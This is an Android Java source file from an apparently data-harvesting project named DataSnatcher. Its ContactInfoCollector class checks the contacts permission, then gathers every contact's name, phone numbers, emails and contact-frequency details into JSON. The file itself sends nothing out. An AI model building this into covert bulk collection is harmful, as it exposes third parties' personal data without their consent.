package com.example.DataSnatcher.collector.ContactInfo;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.example.DataSnatcher.collector.IInfoCollector;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactInfoCollector implements IInfoCollector {
    private static final String TAG = "ContactInfoCollector";
    private final Context context;

    // 所需权限
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_CONTACTS
    };

    public ContactInfoCollector(Context context) {
        if (context == null) {
            throw new IllegalArgumentException("Context 不能为 null");
        }
        this.context = context.getApplicationContext();
    }

    @Override
    public String getCategory() {
        return "联系人信息";
    }

    @Override
    public JSONObject collect() {
        JSONObject contactInfo = new JSONObject();
        JSONArray contactsArray = new JSONArray();

        // 检查权限
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) 
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "没有读取联系人权限");
            try {
                contactInfo.put("error", "没有读取联系人权限");
            } catch (JSONException e) {
                Log.e(TAG, "JSON异常", e);
            }
            return contactInfo;
        }

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = null;
        Cursor phoneCursor = null;
        Cursor emailCursor = null;

        try {
            // 查询所有联系人
            cursor = contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts._ID)
                    );
                    String displayName = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                    );

                    JSONObject contact = new JSONObject();
                    contact.put("display_name", displayName);

                    // 获取电话号码
                    phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null
                    );

                    JSONArray phoneNumbers = new JSONArray();
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(
                                    phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                            );
                            phoneNumbers.put(phoneNumber);
                        }
                        phoneCursor.close();
                    }
                    contact.put("phone_numbers", phoneNumbers);

                    // 获取邮箱
                    emailCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null
                    );

                    JSONArray emails = new JSONArray();
                    if (emailCursor != null) {
                        while (emailCursor.moveToNext()) {
                            String email = emailCursor.getString(
                                    emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)
                            );
                            emails.put(email);
                        }
                        emailCursor.close();
                    }
                    contact.put("emails", emails);

                    // 获取其他信息
                    contact.put("last_updated", cursor.getLong(
                            cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP)
                    ));
                    contact.put("last_time_contacted", cursor.getLong(
                            cursor.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED)
                    ));
                    contact.put("times_contacted", cursor.getInt(
                            cursor.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED)
                    ));
                    contact.put("starred", cursor.getInt(
                            cursor.getColumnIndex(ContactsContract.Contacts.STARRED)
                    ));

                    contactsArray.put(contact);
                }
            }

            contactInfo.put("contacts", contactsArray);

        } catch (JSONException e) {
            Log.e(TAG, "JSON异常", e);
            try {
                contactInfo.put("error", "JSON处理异常: " + e.getMessage());
            } catch (JSONException ex) {
                Log.e(TAG, "无法添加错误信息到JSON", ex);
            }
        } catch (Exception e) {
            Log.e(TAG, "获取联系人信息时发生异常", e);
            try {
                contactInfo.put("error", "获取联系人信息异常: " + e.getMessage());
            } catch (JSONException ex) {
                Log.e(TAG, "无法添加错误信息到JSON", ex);
            }
        } finally {
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }
            if (phoneCursor != null && !phoneCursor.isClosed()) {
                phoneCursor.close();
            }
            if (emailCursor != null && !emailCursor.isClosed()) {
                emailCursor.close();
            }
        }

        return contactInfo;
    }
} 